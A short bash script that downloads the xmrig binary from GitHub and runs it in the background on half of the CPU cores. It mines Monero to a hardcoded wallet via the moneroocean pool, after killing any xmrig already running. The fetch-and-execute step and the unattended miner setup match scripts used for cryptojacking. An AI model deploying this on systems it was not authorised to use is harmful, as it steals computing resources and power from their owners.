#!/bin/bash
WALLET=458dxk6pcKg3KR6YGVByY1FKKr88GPnz3XxQL7c7zx5UNoxAsKzMN4JJ8zbffq4LRv8dk5CXYBVAEdYBe2avS9qt7jjjKpa
DIR="mo_miner"

# 1. Clean up
killall -9 xmrig 2>/dev/null
rm -rf "$DIR" && mkdir -p "$DIR" && cd "$DIR"

# 2. Download
curl -L "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz" | tar xz --strip-components=1

# 3. Calculate 50% of available cores automatically
# This works on 1, 4, 32, or 64 cores.
CORES=$(nproc)
THREADS=$((CORES / 2))
if [ $THREADS -lt 1 ]; then THREADS=1; fi

# 4. Launch
# We use -t $THREADS to skip the hardware discovery check
./xmrig -o gulf.moneroocean.stream:10128 -u $WALLET -p auto-worker -t $THREADS --randomx-mode=light --no-cpu-topology -B

echo "SUCCESS: Auto-detected $CORES cores. Launched on $THREADS threads."